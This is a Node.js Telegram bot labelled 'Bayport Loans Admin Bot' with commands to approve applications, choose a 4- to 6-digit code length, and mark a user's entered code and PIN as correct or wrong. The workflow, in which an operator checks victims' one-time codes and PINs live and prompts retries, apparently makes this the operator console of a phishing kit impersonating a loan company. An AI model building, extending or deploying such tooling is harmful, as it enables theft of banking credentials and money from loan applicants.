const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const axios = require('axios');

dotenv.config();

// Use a unique variable name - check if there's no duplicate
const botToken = process.env.BOT_TOKEN;  // Changed from 'token' to 'botToken'
const backendUrl = process.env.BACKEND_URL || 'http://localhost:5000';

if (!botToken) {
    console.error('❌ BOT_TOKEN not found in environment variables');
    process.exit(1);
}

// Initialize bot with the token
const bot = new TelegramBot(botToken, { polling: true });

console.log('🤖 Bayport Loans Telegram Bot Started');
console.log(`📡 Backend URL: ${backendUrl}`);

// /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        '🚀 *Bayport Loans Admin Bot*\n\n' +
        '*Commands:*\n' +
        '• `/approve_[ref]` - Approve application\n' +
        '• `/reject_[ref]` - Reject application\n' +
        '• `/correct_[ref]` - Mark code as correct\n' +
        '• `/wrong_[ref]` - Mark code as wrong\n' +
        '• `/pin_correct_[ref]` - Mark PIN as correct\n' +
        '• `/pin_wrong_[ref]` - Mark PIN as wrong\n\n' +
        '*Example:* `/approve_BLABC123`',
        { parse_mode: 'Markdown' }
    );
});

// Approve command
bot.onText(/\/approve_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match[1];
    
    bot.sendMessage(chatId, 
        `✅ *Application Approved*\n\nReference: ${refId}\n\nSelect code length:`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '4 Digits', callback_data: `code4_${refId}` },
                        { text: '5 Digits', callback_data: `code5_${refId}` },
                        { text: '6 Digits', callback_data: `code6_${refId}` }
                    ]
                ]
            }
        }
    );
});

// Reject command
bot.onText(/\/reject_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match[1];
    bot.sendMessage(chatId, `❌ *Application Rejected*\n\nReference: ${refId}`, { parse_mode: 'Markdown' });
});

// Code correct
bot.onText(/\/correct_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match[1];
    bot.sendMessage(chatId, `✅ *Code Correct*\n\nReference: ${refId}\n\nWaiting for PIN...`, { parse_mode: 'Markdown' });
});

// Code wrong
bot.onText(/\/wrong_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match[1];
    bot.sendMessage(chatId, `❌ *Wrong Code*\n\nReference: ${refId}\n\nUser will try again.`, { parse_mode: 'Markdown' });
});

// PIN correct
bot.onText(/\/pin_correct_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match[1];
    bot.sendMessage(chatId, `✅ *PIN Correct*\n\nReference: ${refId}\n\nApplication Complete!`, { parse_mode: 'Markdown' });
});

// PIN wrong
bot.onText(/\/pin_wrong_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const refId = match[1];
    bot.sendMessage(chatId, `❌ *Wrong PIN*\n\nReference: ${refId}\n\nUser will try again.`, { parse_mode: 'Markdown' });
});

// Handle inline keyboard callbacks
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const [action, refId] = callbackQuery.data.split('_');
    
    let codeLength = '';
    if (action === 'code4') codeLength = '4-digit';
    if (action === 'code5') codeLength = '5-digit';
    if (action === 'code6') codeLength = '6-digit';
    
    bot.sendMessage(msg.chat.id, 
        `✅ *${codeLength} code selected*\n\nReference: ${refId}\n\nThe user will now be prompted for a ${codeLength} code.`,
        { parse_mode: 'Markdown' }
    );
    
    bot.answerCallbackQuery(callbackQuery.id);
});

// Error handling
bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

console.log('✅ Bot is running and waiting for commands...');